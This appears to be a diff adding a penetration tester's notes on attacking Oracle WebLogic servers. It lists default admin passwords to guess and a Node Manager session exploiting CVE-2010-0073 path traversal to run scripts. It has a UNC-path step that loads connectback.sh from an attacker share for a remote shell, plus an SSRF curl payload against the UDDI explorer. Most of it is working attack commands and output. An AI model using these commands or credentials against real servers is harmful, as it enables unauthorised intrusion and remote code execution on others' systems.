@@ -1,0 +1,64 @@
+# oracle weblogic
+
+# admin console
+http://host:port/console (port 7001/tcp by default)
+default admin username: weblogic
+password needs to have digit I think, so try weblogic1, welcome1, etc.
+also read about system/password (before peoplesoft tools 8.5) and system/Passw0rd
+http://gasparotto.blogspot.com.au
+
+## Oracle WebLogic Server Node Manager
+# File Traversal RCE (CVE-2010-0073)
+* preauth with Oracle WebLogic Server <= 10.3.2, postauth otherwise
+http://intevydis.blogspot.com/2010/01/oracle-weblogic-1032-node-manager-fun.html (post deleted :()
+$ openssl s_client -host 1.2.3.4 -port 5556 -ssl2
+hello blah
++OK Node manager v10.3 started
+DOMAIN xyz
+-ERR I/O error while reading domain directory
+GETNMLOG
+java.io.FileNotFoundException: Domain directory ‘C:\OracleMiddleware\wl_server\10.3\common\nodemanager’ invalid
+DOMAIN wl_server
++OK Current domain set to ‘wl_server’
+EXECSCRIPT ../../../../../../../../Windows/System32/ping.exe
+-ERR 1
+GETNMLOG
+<help usage of ping>
+
+* postauth
+domain <domain> #can be found in /dms or /console or in URLs or uddi (maybe?)
+user weblogic
+pass Welcome1
+execscript ../../../../../../../../../../../../../../../bin/dispuid
+getnmlog
+
+# more info about Node Manager (default port 5556)
+http://pietermalan.blogspot.fr/2012/04/interacting-with-nodemanager.html
+Node Manager utility is used to start stop server instances remotely
+default domains wl_server and medrec
+
+# UNC Path RCE
+domain <domain> \\attackerip\share
+execscript connectback.sh
+
+# command line client to remotely deploy webapp (i think it calls /bea_wls_cluster_internal/DeploymentService)
+http://docs.oracle.com/cd/E13222_01/wls/docs90/deployment/wldeployer.html
+http://docs.oracle.com/cd/E15051_01/wls/docs103/deployment/deploy.html
+
+# default deployed apps on weblogic
+/dms
+/_async
+/bea_wls_cluster_internal
+/bea_wls_deployment_internal
+/bea_wls_internal
+/uddi
+/uddiexplorer
+/inspection.wsil
+
+# UDDI
+SSRF: $ curl -s http://vuln/uddiexplorer/SearchPublicRegistries.jsp -d 'operator=http%3A%2F%2F127.0.0.1:22%2Fwoot&rdoSearch=name&txtSearchname=asdf&btnSubmit=Search'
+server expects SOAP response (see uddi wdsl on internet)
+
+# misc
+LSV hsc sur rce via le protocole T3
+https://blog.netspi.com/decrypting-weblogic-passwords/
